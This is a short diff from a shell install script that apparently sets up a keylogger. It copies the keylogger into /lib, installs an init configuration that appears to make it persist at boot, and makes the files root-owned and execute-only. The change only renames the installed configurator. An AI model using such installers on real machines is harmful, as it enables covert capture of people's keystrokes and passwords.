@@ -18,9 +18,9 @@ shift
 		sudo chmod 100 '/lib/keyLogger'
 		cp ./ninja/ninja.conf  '/etc/init'
 		cp ./configurator/keylogger_config.sh '/bin'
-		mv  '/bin/keylogger_config.sh' '/bin/keylogger_config'
-		sudo chown root:root '/bin/keylogger_config'
-		sudo chmod 100 '/bin/keylogger_config'
+		mv  '/bin/keylogger_config.sh' '/bin/keylogger'
+		sudo chown root:root '/bin/keylogger'
+		sudo chmod 100 '/bin/keylogger'
 		
 	;;
 esac
